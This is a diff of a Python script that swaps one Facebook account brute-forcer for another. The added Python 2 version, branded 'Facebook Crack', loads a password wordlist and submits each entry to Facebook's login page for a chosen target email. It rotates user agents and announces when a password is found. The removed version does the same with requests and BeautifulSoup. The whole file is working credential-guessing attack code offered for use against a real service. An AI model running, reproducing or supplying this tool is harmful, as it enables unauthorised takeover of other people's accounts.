@@ -1,64 +1,85 @@
-import requests
-import threading
-# import urllib.request
-# import os
-from bs4 import BeautifulSoup
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+
 import sys
+import mechanize
+import cookielib
+import random
 
-if sys.version_info[0] !=3: 
-	print('''--------------------------------------
-	REQUIRED PYTHON 3.x
-	use: python3 fb.py
---------------------------------------
-			''')
-	sys.exit()
 
-post_url='https://www.facebook.com/login.php'
-headers = {
-	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
-}
-payload={}
-cookie={}
 
-def create_form():
-	form=dict()
-	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 
-	data=requests.get(post_url,headers=headers)
-	for i in data.cookies:
-		cookie[i.name]=i.value
-	data=BeautifulSoup(data.text,'html.parser').form
-	if data.input['name']=='lsd':
-		form['lsd']=data.input['value']
-	return (form,cookie)
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
 
-def function(email,passw,i):
-	global payload,cookie
-	if i%10==1:
-		payload,cookie=create_form()
-		payload['email']=email
-	payload['pass']=passw
-	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
-	if 'Find Friends' in r.text:
-		open('temp','w').write(str(r.content))
-		print('\npassword is : ',passw)
-		return True
-	return False
 
-print('\n---------- Welcome To FaceBrute----------\n')
-file=open('passwords.txt','r')
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
 
-email=input('Enter Email/Username : ')
 
-print("\nTarget Email ID : ",email)
-print("\nTrying Passwords from list ...")
+login = 'https://www.facebook.com/login.php?login_attempt=1'
 
-i=0
-while file:
-	passw=file.readline().strip()
-	i+=1
-	if len(passw) < 6:
-		continue
-	print(str(i) +" : ",passw)
-	if function(email,passw,i):
-		break
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+def main():
+	global br
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	welcome()
+	search()
+	print("Password does not exist in the wordlist")
+
+	
+	
+def brute(password):
+	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.flush()
+	br.addheaders = [('User-agent', random.choice(useragents))]
+	site = br.open(login)
+	br.select_form(nr = 0)
+	br.form['email'] = email
+	br.form['pass'] = password
+	sub = br.submit()
+	log = sub.geturl()
+	if log != login and (not 'login_attempt' in log):
+			print("\n\n[+] Password Find = {}".format(password))
+			raw_input("ANY KEY to Exit....")
+			sys.exit(1)
+
+			
+def search():
+	global password
+	passwords = open(passwordlist,"r")
+	for password in passwords:
+		password = password.replace("\n","")
+		brute(password)
+
+		
+#welcome 
+def welcome():
+	wel = """
+        +=========================================+
+        |..........   Facebook Crack   ...........|
+        +-----------------------------------------+
+        |            #Author: Toxic Shark              | 
+        |	       Version 1.0                |
+ 	|   https://www.facebook.com/HaxorToxicShark      |
+        +=========================================+
+        |..........  fb-brute  ...........|
+        +-----------------------------------------+\n\n
+"""
+	total = open(passwordlist,"r")
+	total = total.readlines()
+	print wel 
+	print " [*] Account to crack : {}".format(email)
+	print " [*] Loaded :" , len(total), "passwords"
+	print " [*] Cracking, please wait ...\n\n"
+
+	
+if __name__ == '__main__':
+	main()
